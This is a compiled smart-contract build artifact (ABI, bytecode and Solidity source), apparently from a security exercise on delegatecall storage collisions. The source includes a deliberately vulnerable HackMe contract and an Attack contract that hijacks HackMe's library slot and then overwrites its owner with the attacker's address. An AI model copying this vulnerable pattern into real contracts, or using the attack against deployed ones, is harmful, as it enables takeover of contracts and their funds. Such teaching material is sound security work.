{
  "contractName": "Lib",
  "abi": [
    {
      "inputs": [],
      "name": "someNumber",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_num",
          "type": "uint256"
        }
      ],
      "name": "doSomething",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561000f575f80fd5b506101268061001d5f395ff3fe6080604052348015600e575f80fd5b50600436106030575f3560e01c8063931c9b99146034578063a6b206bf14604e575b5f80fd5b603a6066565b60405160459190608a565b60405180910390f35b606460048036038101906060919060ca565b606b565b005b5f5481565b805f8190555050565b5f819050919050565b6084816074565b82525050565b5f602082019050609b5f830184607d565b92915050565b5f80fd5b60ac816074565b811460b5575f80fd5b50565b5f8135905060c48160a5565b92915050565b5f6020828403121560dc5760db60a1565b5b5f60e78482850160b8565b9150509291505056fea26469706673582212206015b175afe80a1658817b06c77cffcc893e891931a22500fb590b671dec393764736f6c63430008150033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.13;\r\n\r\ncontract Lib {\r\n    uint public someNumber;\r\n\r\n\r\n    function doSomething(uint _num) public {\r\n        someNumber = _num;\r\n    }\r\n}\r\n\r\n\r\ncontract HackMe {\r\n    address public lib;\r\n    address public owner;\r\n    uint public someNumber;\r\n\r\n\r\n    constructor(address _lib) {\r\n        lib = _lib;\r\n        owner = msg.sender;\r\n    }\r\n\r\n\r\n    function doSomething(uint _num) public {\r\n        (bool rent, ) = lib.delegatecall(abi.encodeWithSignature(\"doSomething(uint256)\", _num));\r\n        require(rent, \"Failed to invoke HackMe.doSomething!\");\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n\r\n    address public lib;\r\n    address public owner;\r\n    uint public someNumber;\r\n    address public attacker;\r\n\r\n\r\n    HackMe public hackMe;\r\n\r\n\r\n    constructor(HackMe _hackMe) {\r\n        hackMe = HackMe(_hackMe);\r\n        attacker = msg.sender;\r\n    }\r\n\r\n\r\n    function attack() public {\r\n        hackMe.doSomething(uint(uint160(address(this))));\r\n\r\n        hackMe.doSomething(uint(uint160(attacker)));\r\n    }\r\n\r\n    function doSomething(uint _num) public {\r\n        owner = address(uint160(_num));\r\n    }\r\n}",
  "sourcePath": "D:\\workPlace\\任务\\9月\\题目修改\\Attack\\DelegateCall\\contracts\\HackMe.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.21+commit.d9974bed.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-12T07:59:03.693Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}